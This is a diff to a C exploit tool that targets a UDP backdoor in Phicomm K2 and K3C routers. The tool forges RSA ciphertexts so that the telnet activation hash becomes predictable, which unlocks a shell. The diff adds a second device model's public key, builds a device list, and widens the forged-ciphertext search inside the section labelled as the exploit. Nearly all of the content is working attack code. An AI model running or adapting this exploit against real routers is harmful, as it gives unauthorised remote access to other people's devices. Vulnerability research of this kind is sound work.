@@ -12,9 +12,8 @@
 #include <openssl/md5.h>
 #include <openssl/rsa.h>
 
-
 #define SCAN_DELAY  300000
-#define STAGE_DELAY 10000
+#define STAGE_DELAY 100000
 #define BACKDOOR_PORT 21210
 #define TELNET_PORT 23
 #define PLAINTEXT_LENGTH 0x20
@@ -25,8 +24,14 @@
 #define WIPE() { memset(plaintext, 0, PLAINTEXT_LENGTH+1); memset(ciphertext, 0, CIPHERTEXT_LENGTH); }
 
 
-#define K2G_DEVICE_IDENTIFIER "K2_COSTDOWN__VER_3.0"
-//#define DEVICE_IDENTIFIER "what_if_it_was_wrong"
+
+
+void print_from(struct sockaddr_in *from) {
+  char *ns;
+  ns = inet_ntoa(from->sin_addr);
+  fprintf(stdout, "[<] remote address %s:%d\n", ns, ntohs(from->sin_port) & 0xFFFF);
+  return;
+}
 
 /////// Hexdump code
 
@@ -83,20 +88,19 @@ unsigned char *device_identifying_hash(const char *identifier) {
 
 ////// RSA stuff
 
-#define K2G_HARDCODED_n  "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691"
-
-#define K2G_HARDCODED_e 0x10001
 
 
-RSA *init_rsa(char *public_n, int public_e) {
+
+
+RSA *init_rsa(const char *public_n, const char *public_e) {
   BIGNUM *e;
   BIGNUM *n;
   RSA *rsa;
   rsa = RSA_new();
   n = BN_new();
   e = BN_new();
-  BN_set_word(e, public_e);
   BN_hex2bn(&n, public_n);
+  BN_hex2bn(&e, public_e);
   rsa->e = e;
   rsa->n = n;
   return rsa;
@@ -157,7 +161,12 @@ int test() {
   char test_case[PLAINTEXT_LENGTH] = "S<:2\\fPve:j%lJ$j%A[DGQ-v|p,-;Tr";
   int res;
   RSA *rsa;
-  rsa = init_rsa(K2G_HARDCODED_n, K2G_HARDCODED_e);
+
+  rsa = init_rsa("E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD7"
+                 "24AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B38"
+                 "8451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7"
+                 "AF52829E9F858691",
+                 "010001");
 
   unsigned char expected[CIPHERTEXT_LENGTH] = {
 	0xdd,	0x02,	0x0a,	0x44,	0x45,	0x84,	0xbd,	0xf4,
@@ -244,16 +253,18 @@ int communicate(char *ip_addr,
   printf("[>] Message sent.\n");
 
 
-  if (resp_len) {
+  if (resp_len > 0) {
     printf("[-] Expecting %d bytes in reply...\n", resp_len);
     printf("[-] Setting socket timeout to %lds + %ldus\n", tv.tv_sec, tv.tv_usec);
-    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    //setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     
     // Here we might want to read from the socket in chunks, without
     // blocking indefinitely...
     //
     n = recvfrom(sockfd, resp, resp_len, NO_FLAGS,
         (struct sockaddr *) &server_resp_addr, &len);
+
+    print_from(&server_resp_addr);
 
     printf("\n[<] Received %ld bytes in reply:\n", n);
     hexdump(resp, n);
@@ -298,7 +309,7 @@ struct DeviceList {
   unsigned char *hash;
   const char *identifier;
   const char *public_n;
-  int public_e;
+  const char *public_e;
   struct DeviceList *next;
 };
 
@@ -306,7 +317,7 @@ struct DeviceList {
 struct DeviceList * add_entry_to_device_list(struct DeviceList *DL, 
     const char *identifier,
     const char *public_n,
-    int public_e) {
+    const char *public_e) {
   struct DeviceList * node;
   node = DL;
 
@@ -336,7 +347,7 @@ struct DeviceList * add_entry_to_device_list(struct DeviceList *DL,
   printf("[+] Added device to list:\n"
       "    - identifier: %s\n"
       "    - public_n: 0x%s\n"
-      "    - public_e 0x%X\n"
+      "    - public_e 0x%s\n"
       "    - hash:\n",
       identifier,
       public_n,
@@ -365,14 +376,22 @@ struct DeviceList * init_device_list() {
   DL = (struct DeviceList *) malloc(sizeof(struct DeviceList));
   memset(DL, 0, sizeof(struct DeviceList));
 
-  /** TODO: Build this device list. We only have one example for now,
-   * so we can leave this for later. But I'd like to set it up eventually.
-   */
+  add_entry_to_device_list(DL,
+    "K2_COSTDOWN__VER_3.0",
+    "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD7"
+    "24AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B38"
+    "8451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7"
+    "AF52829E9F858691",
+    "010001");
 
   add_entry_to_device_list(DL,
-    K2G_DEVICE_IDENTIFIER,
-    K2G_HARDCODED_n,
-    K2G_HARDCODED_e);
+    "K3C_INTELALL_VER_3.0",
+    "E7FFD1A1BB9834966763D1175CFBF1BA2DF53A004B62977E5B985DFFD6D43785E5BCA088A6417BAF"
+    "070BCE199B043C24B03BCEB970D7E47EEBA7F59D2BE4764DD8F06DB8E0E2945C912F52CB31C56C83"
+    "49B689198C4A0D88FD029CCECDDFF9C1491FFB7893C11FAD69987DBA15FF11C7F1D570963FA3825B"
+    "6AE92815388B3E03",
+    "010001");
+
 
   return DL;
 }
@@ -446,7 +465,7 @@ struct DeviceList * probe_udp_port(struct DeviceList *DL,
 
 //// Exploit
 
-#define PHONY_CIPHERTEXT_LENGTH 0x20
+#define PHONY_CIPHERTEXT_LENGTH 0x80
 
 void random_buffer(unsigned char *buf, int len) {
   FILE *urandom;
@@ -458,8 +477,9 @@ void random_buffer(unsigned char *buf, int len) {
 
 unsigned char *find_phony_ciphertext(RSA *rsa) {
   unsigned char *phony_ciphertext;
-  unsigned char phony_plaintext[0x80];
-  memset(phony_plaintext, 0, 0x80);
+  unsigned char phony_plaintext[1024];
+  int plaintext_length;
+  memset(phony_plaintext, 0, 0x20);
   phony_ciphertext = calloc(PHONY_CIPHERTEXT_LENGTH, sizeof(char));
   do {
 
@@ -473,10 +493,10 @@ unsigned char *find_phony_ciphertext(RSA *rsa) {
       printf("[-] We don't have a matching public key for this target\n"
           "    so we'll just throw random buffers at it and see what sticks.\n"
           "    returning:\n");
-      hexdump(phony_ciphertext, PLAINTEXT_LENGTH);
+      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
       return phony_ciphertext;
     }
-    decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
+    plaintext_length = decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
     // If the first character of phony_plaintext is printable, then
     // there is a chance it will collide with the first character of
     // the secret, random string. Since the phony_plaintext will be
@@ -485,11 +505,13 @@ unsigned char *find_phony_ciphertext(RSA *rsa) {
     // operation that's used to produce the telnet activation keys
     // to append an EMPTY STRING to the salt/suffix. And this will
     // make the MD5 hash of the secret predictable.
-    if ((0x21 <= phony_plaintext[0]) && (phony_plaintext[0] < 0x7f)) {
+    if ((plaintext_length < 0x101) && 
+        (0x21 <= phony_plaintext[0]) && 
+        (phony_plaintext[0] < 0x7f)) {
       printf("[!] Found stage 2 payload:\n");
-      hexdump(phony_ciphertext, PLAINTEXT_LENGTH);
-      printf("[=] Decrypts to:\n");
-      hexdump(phony_plaintext, PLAINTEXT_LENGTH);
+      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
+      printf("[=] Decrypts to (%d bytes):\n", plaintext_length);
+      hexdump(phony_plaintext, plaintext_length);
       return phony_ciphertext;
     }
   } while (1);
@@ -514,30 +536,6 @@ int main(int argc, char **argv) {
     test();
     exit(0);
   }
-
-  if (!(strcmp(argv[1], "enc"))) {
-    rsa = init_rsa(K2G_HARDCODED_n, K2G_HARDCODED_e);
-    fread(plaintext, sizeof(char), PLAINTEXT_LENGTH, stdin);
-    fflush(stdin);
-    fprintf(stderr, "[+] Read data:\n");
-    fhexdump(stderr, plaintext, PLAINTEXT_LENGTH);
-    fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, 
-        strlen((char *) plaintext));
-    encrypt_with_pubkey(rsa, plaintext, ciphertext);
-    hexdump(ciphertext, CIPHERTEXT_LENGTH);
-    exit(0);
-  } else if (!(strcmp(argv[1], "dec"))) {
-    rsa = init_rsa(K2G_HARDCODED_n, K2G_HARDCODED_e);
-    fread(ciphertext, sizeof(char), CIPHERTEXT_LENGTH, stdin);
-    fprintf(stderr, "[+] Read data:\n");
-    fhexdump(stderr, ciphertext, CIPHERTEXT_LENGTH);
-    fprintf(stderr, "[+] Decrypting with public key...\n");
-    decrypt_with_pubkey(rsa, ciphertext, plaintext);
-    hexdump(plaintext, PLAINTEXT_LENGTH);
-    fprintf(stderr, "[+] strlen(decrypt_with_pubkey(payload)) = %ld\n", strlen((char *) plaintext)); 
-    exit(0);
-  }
-     
 
   /** The exploit **/
 
@@ -729,10 +727,10 @@ STAGE_II:
     bar('=');
     memset(buffer, 0, CIPHERTEXT_LENGTH);
     phony_ciphertext = find_phony_ciphertext(rsa);  
-    // This blocks and waits to long in CHAOS_MODE
+    // This blocks and waits too long in CHAOS_MODE
     com_res = communicate(ip_addr, backdoor_port,
         phony_ciphertext,
-        0x20,
+        PHONY_CIPHERTEXT_LENGTH,
         buffer,
         CIPHERTEXT_LENGTH,
         stage_delay);
